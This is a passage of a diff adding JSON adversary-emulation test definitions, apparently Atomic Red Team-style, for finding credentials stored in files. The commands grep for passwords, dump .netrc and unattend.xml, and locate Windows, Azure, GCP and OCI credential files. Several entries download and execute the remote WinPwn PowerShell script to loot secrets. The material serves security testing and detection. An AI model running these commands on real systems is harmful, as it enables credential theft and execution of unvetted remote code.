+                        "supported_platforms": [
+                            "linux",
+                            "macos"
+                        ],
+                        "input_arguments": {
+                            "file_path": {
+                                "description": "Path to search",
+                                "type": "string",
+                                "default": "/"
+                            }
+                        },
+                        "executor": {
+                            "command": "grep -ri password #{file_path}\nexit 0\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Extracting passwords with findstr",
+                        "auto_generated_guid": "0e56bf29-ff49-4ea5-9af4-3b81283fd513",
+                        "description": "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -ErrorAction SilentlyContinue -Pattern password\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Access unattend.xml",
+                        "auto_generated_guid": "367d4004-5fc0-446d-823f-960c74ae52c3",
+                        "description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Find and Access Github Credentials",
+                        "auto_generated_guid": "da4f751a-020b-40d7-b9ff-d433b7799803",
+                        "description": "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.\n",
+                        "supported_platforms": [
+                            "linux",
+                            "macos"
+                        ],
+                        "input_arguments": {
+                            "file_path": {
+                                "description": "Path to search",
+                                "type": "string",
+                                "default": "/home"
+                            }
+                        },
+                        "executor": {
+                            "name": "bash",
+                            "elevation_required": false,
+                            "command": "for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done\n"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - sensitivefiles",
+                        "auto_generated_guid": "114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0",
+                        "description": "Search for sensitive files on this local system using the SensitiveFiles function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsensitivefiles -noninteractive -consoleoutput",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - Snaffler",
+                        "auto_generated_guid": "fdd0c913-714b-4c13-b40f-1824d6c015f2",
+                        "description": "Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSnaffler -noninteractive -consoleoutput",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - powershellsensitive",
+                        "auto_generated_guid": "75f66e03-37d3-4704-9520-3210efbe33ce",
+                        "description": "Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - passhunt",
+                        "auto_generated_guid": "00e3e3c7-6c3c-455e-bd4b-461c7f0e7797",
+                        "description": "Search for Passwords on this system using passhunt via WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npasshunt -local $true -noninteractive",
+                            "cleanup_command": "rm -force .\\passhunt.exe -ErrorAction Ignore\nrm -force .\\phunter* -ErrorAction Ignore\nrm -force -recurse .\\DomainRecon -ErrorAction Ignore\nrm -force -recurse .\\Exploitation -ErrorAction Ignore\nrm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore\nrm -force -recurse .\\LocalRecon -ErrorAction Ignore\nrm -force -recurse .\\Vulnerabilities -ErrorAction Ignore",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - SessionGopher",
+                        "auto_generated_guid": "c9dc9de3-f961-4284-bd2d-f959c9f9fda5",
+                        "description": "Launches SessionGopher on this system via WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsessionGopher -noninteractive -consoleoutput",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials",
+                        "auto_generated_guid": "aaa87b0e-5232-4649-ae5c-f1724a4b2798",
+                        "description": "Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud -consoleoutput -noninteractive  ",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "List Credential Files via PowerShell",
+                        "auto_generated_guid": "0d4f2281-f720-4572-adc8-d5bb1618affe",
+                        "description": "Via PowerShell,list files where credentials are stored in Windows Credential Manager\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "$usernameinfo = (Get-ChildItem Env:USERNAME).Value\nGet-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Roaming\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Local\\Microsoft\\Credentials\\\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "List Credential Files via Command Prompt",
+                        "auto_generated_guid": "b0cdacf6-8949-4ffe-9274-a9643a788e55",
+                        "description": "Via Command Prompt,list files where credentials are stored in Windows Credential Manager\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "dir /a:h C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials\\\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Find Azure credentials",
+                        "auto_generated_guid": "a8f6148d-478a-4f43-bc62-5efee9f931a4",
+                        "description": "Find local Azure credentials from file, defaults to using / as the look path.\n",
+                        "supported_platforms": [
+                            "macos",
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "file_path": {
+                                "description": "Path to search",
+                                "type": "string",
+                                "default": "/"
+                            }
+                        },
+                        "executor": {
+                            "command": "find #{file_path}/.azure -name \"msal_token_cache.json\" -o -name \"accessTokens.json\" -type f 2>/dev/null\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Find GCP credentials",
+                        "auto_generated_guid": "aa12eb29-2dbb-414e-8b20-33d34af93543",
+                        "description": "Find local Google Cloud Platform credentials from file, defaults to using / as the look path.\n",
+                        "supported_platforms": [
+                            "macos",
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "file_path": {
+                                "description": "Path to search",
+                                "type": "string",
+                                "default": "/"
+                            }
+                        },
+                        "executor": {
+                            "command": "find #{file_path}/.config/gcloud -name \"credentials.db\" -o -name \"access_tokens.db\" -type f 2>/dev/null\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Find OCI credentials",
+                        "auto_generated_guid": "9d9c22c9-fa97-4008-a204-478cf68c40af",
+                        "description": "Find local Oracle cloud credentials from file, defaults to using / as the look path.\n",
+                        "supported_platforms": [
+                            "macos",
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "file_path": {
+                                "description": "Path to search",
+                                "type": "string",
+                                "default": "/"
+                            }
+                        },
+                        "executor": {
+                            "command": "find #{file_path}/.oci/sessions -name \"token\" -type f 2>/dev/null\n",
+                            "name": "sh"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 16:00:05"
+}
